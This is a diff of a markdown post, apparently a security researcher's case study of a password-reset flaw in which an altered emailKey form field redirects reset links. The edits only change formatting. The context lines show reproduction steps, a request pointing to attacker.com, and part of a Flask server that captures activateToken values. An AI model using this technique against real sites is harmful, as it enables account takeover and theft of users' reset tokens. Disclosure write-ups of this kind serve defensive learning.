@@ -6,19 +6,19 @@ export const metadata = {
 
 # Exploiting Password Reset Vulnerabilities: A Case Study
 
-## Introduction
+# Introduction
 
 Password reset features are critical to account recovery workflows, but misconfigurations can open the door to severe security risks. Recently, I discovered a vulnerability in the password reset implementation of **[Redacted Company]**, which allowed an attacker to hijack the password reset process and potentially compromise user accounts.
 
----
 
-## Summary of the Vulnerability
+
+# Summary of the Vulnerability
 
 The vulnerability was found in the password reset mechanism of the platform, specifically in how the `emailKey` parameter was handled in the form data. By altering this parameter, an attacker could redirect password reset requests to their own malicious website.
 
----
 
-## Steps to Reproduce
+
+# Steps to Reproduce
 
 1. **Create an account**: Register a new account on **[Redacted Company]**'s platform.  
 2. **Initiate password reset**: Request a password reset for the account.  
@@ -35,9 +35,9 @@ The vulnerability was found in the password reset mechanism of the platform, spe
 5. **Send the modified request**: The victim receives an email with the manipulated reset link.  
 6. **Click the reset link**: When the victim clicks the link, the attacker harvests sensitive tokens (e.g., `activateToken`) and gains control of the account.
 
----
 
-## Supporting Material
+
+# Supporting Material
 
 ### Request Example:
 
@@ -48,10 +48,9 @@ Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
 email={VICTIM_EMAIL}&userName={VICTIM_USERNAME}&emailKey=https%3A%2F%2Fattacker.com%2F.edm.FGTPASS.data
 ```
----
----
 
-## Exploitation Code:
+
+# Exploitation Code:
 
 ```
 from flask import Flask, request, jsonify
@@ -73,6 +72,6 @@ def capture_token():
 ```
 this will mimic the original /.edm.FGTPASS.data and steal the ``activateToken``, then upload to the server. By replacing the ``emailKey``, we are able to steal  the ``activateToken``.
 
-## Conclusion
+# Conclusion
 
 Do not trust client-side request, do not put something like this. The email template should be prepared in the backend.
